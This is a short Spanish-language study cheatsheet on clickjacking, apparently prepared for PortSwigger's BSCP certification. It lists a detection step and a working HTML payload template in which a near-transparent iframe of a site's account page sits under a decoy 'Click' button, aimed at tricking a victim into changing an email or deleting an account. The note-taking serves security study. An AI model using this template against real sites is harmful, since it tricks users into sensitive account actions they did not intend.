---
tipo: cheatsheet
vuln: clickjacking
tags: [bscp, tipo/cheatsheet, vuln/clickjacking]
relacionada: "[[Clickjacking]]"
---

# CS · Clickjacking

## Flujo repetible
1. Comprueba si la página se puede enmarcar (falta X-Frame-Options/frame-ancestors).
2. Superpone un iframe transparente con un señuelo.

## Detección
```
Enmarca {{BASE}} en un iframe y comprueba si carga (sin X-Frame-Options / CSP frame-ancestors).
```

## Plantillas de payload
```html
<style>iframe{opacity:0.0001;position:absolute;inset:0;width:100%;height:100%}
#decoy{position:absolute;top:{{N}}px;left:{{N}}px}</style>
<div id="decoy">Click</div>
<iframe src="{{BASE}}/my-account"></iframe>
```

## Escalada al objetivo
Engañar a {{VICTIM}} para que ejecute una acción sensible (cambiar email / borrar cuenta).

## Checklist
- [ ] Confirmé que se puede enmarcar
- [ ] Alineé el señuelo con la acción

## Referencias
- https://portswigger.net/web-security/clickjacking
